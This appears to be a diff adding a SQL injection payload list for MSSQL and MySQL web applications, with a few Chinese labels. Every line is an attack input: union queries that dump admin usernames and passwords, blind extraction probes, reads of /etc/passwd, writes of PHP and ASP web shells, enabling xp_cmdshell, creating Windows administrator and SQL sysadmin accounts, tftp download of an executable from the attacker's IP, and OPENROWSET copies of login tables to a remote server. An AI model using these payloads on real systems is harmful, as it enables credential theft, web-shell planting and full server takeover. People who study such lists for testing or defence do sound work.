@@ -1,0 +1,87 @@
+' or 1=1 into outfile '/home/web1/shell.php
+', userlevel='super
+-1 union select 1,1,1
+1 union select 1,1,1 from members
+1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from users where id=1
+-1 union select char(97),char(97),char(97)
+1=(select * from user where userid=1 and ascii(mid(load_file('/etc/passwd'),1,1)))
+1=(select @@VERSION)
+1=(select count(*) from master.dbo.sysdatabases where name>1 and dbid=7)
+1=(select count(*) FROM master.dbo.sysobjects where xtype = 'X' AND name = 'xp_cmdshell')
+1=(select IS_SRVROLEMEMBER('sysadmin'))
+1=(select top 1 col_name(object_id('admin'),1) from sysobjects)
+1=(select top 1 id from TestDB.dbo.temp )
+1=(select top 1 id from TestDB.dbo.temp where id not in('findstr'))
+1=(select top 1 name from sysobjects where xtype='U' and status>0 and name not in('findtable'))
+1=(select top 1 password from admin where username='admin')
+1=(select user_name()-
+1=1
+1=2
+10000 union select 1,username,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from users where id=1 and ord(mid(password,2,1))=97
+a' or 'a'='a
+admin' or 'a'='a'/*
+bcp "select * from temp" queryout d:\web\shell.asp –c –S localhost –U sqluser –P sqlpass
+bulk insert temp(s1) from 'd:\web\conn.asp'
+create TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread @rootkey='HKEY_LOCAL_MACHINE', @key='SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\', @value_name='/', values=@test OUTPUT insert into paths(path) values(@test)
+create table temp(s1 nvarchar(255),s2 nvarchar(255),s3 nvarchar(255),s4 nvarchar(255))
+declare @a sysname select @a=0x********** backup database db_name() to disk=@a
+declare @a sysname set @a='xp'+'_cm’+’dshell' exec @a 'dir c:\' 
+declare @a sysname;set　@a=db_name();backup database　@a　to　disk='c:\web\shell.asp'
+declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c:\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse'
+declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c:\inetpub\wwwroot\mkwebdir.vbs -w "默认 Web 站点" -v "e","e:\"'
+DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c net user IWAM-IUSR gxgl.com#2004 /add'
+delete from temp
+EXEC master.dbo.sp_addextendedproc 'xp_cmdshell', 'xplog70.dll'
+exec master.dbo.sp_addlogin test,test
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+exec master.dbo.sp_password test,123456,test
+exec master.dbo.xp_cmdshell 'net localgroup administrators IWAM-IUSR /add'
+exec master.dbo.xp_cmdshell 'net user IWAM-IUSR gxgl.com#2004 /add'
+exec master.dbo.xp_cmdshell 'tftp –i 你的IP get file.exe'
+EXEC sp_oacreate 'scripting.filesystemobject',@fso output;EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt';WHILE @shell>0;BEGIN;EXEC sp_oamethod @file,'Readline',@out out;INSERT INTO MYTMP(info) VALUES (@out);EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out;IF @isEnd=1 BREAK;ELSE CONTINUE;END;DROP TABLE MYTMP;
+EXEC sp_oacreate 'wscript.shell',@shell output
+EXEC sp_oamethod @shell,'run',null,'cmd.exe /c dir c:\>c:\temp.txt','0','true'
+exec xp_webserver
+exists(select * from admin where asc(mid(username,1,1))>97)
+exists(select * from admin where ascii(substring(username,1,1))>97)
+exists(select * from admin where len(username)>5)
+exists(select username from admin)
+insert into cmd values("一行一行的代码")
+insert into cmd(str) values(0x3C256578656375746520726571756573742822636D642229262222253E)
+insert into OPENROWSET('SQLOLEDB', 'server=servername;uid=sa;pwd=apachy_123', 'select * from table1') select * from table2
+insert into OPENROWSET('SQLOLEDB', 'uid=sqluser;pwd=sqlpass;Network=DBMSSOCN;Address=192.138.0.1,1433;', 'select * from _sysxlogins') select * from database.dbo.sysxlogins
+insert into temp(id) exec master.dbo.xp_cmdshell 'cscript C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc'
+insert into temp(s1) exec master.dbo.xp_cmdshell 'dir d:\'
+insert into temp(s1) exec master.dbo.xp_cmdshell 'dir d:\web\*.asp /s/a'
+insert into temp(s1) exec master.dbo.xp_cmdshell 'type d:\web\conn.asp'
+insert into temp(s1) exec master.dbo.xp_subdirs 'd:\'
+insert into temp(s1,s2) exec master.dbo.xp_dirtree 'd:\'
+insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 0xffff)
+insert temp exec master.dbo.xp_availablemedia
+LEFT(password,1)=char(97)
+mid(password,4,1)=char(97)
+ord(mid(password,4,1))>97
+---------------------PHP+MYSQL的一些注入语句------------------
+'sa'=(select System_user)
+select * from cmd into outfile "/home/web1/shell.php"
+select * from OPENROWSET('SQLOLEDB', 'uid=sqluser;pwd=sqlpass;Network=DBMSSOCN;Address=192.138.0.1,1433;', 'select * from table')
+select * from user where userid=1 and length(database())>0
+select * from user where userid=1 and length(version())<1777
+SELECT * FROM user WHERE username=0x61646D696E
+SELECT * FROM user WHERE username=char(97,100,109,105,110)
+sp_addextendedproc 'xp_webserver', 'c:\temp\xp_foo.dll'
+sp_dropextendedproc 'xp_webserver'
+test@test.com', 'super')/*
+union select @@version,1,1,1
+union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin
+union select 1,username,password from user/*
+union select id,1,1,1 from admin
+union select password,1,1,1 from users where username = 'admin'-- 
+update [users] set email=(select top 1 name from sysobjects where xtype='u' and status>0) where name='myname'
+use test;create table cmd(str TEXT);
+use test;drop table tmp;
+user_name()='dbo'
+-1 union select 1,username,password,4,5,6,7,8,9,10 from admin
+-1 union all select 1,2,3,load_file(unhex(hex(路径的hex编码))),5
+-1 union all select 1,2,3,load_file('路径/文件名'),5
+-1 union all select 1,2,3,'<?phpinfo();?>',5 into outfile '路径/shell.php'
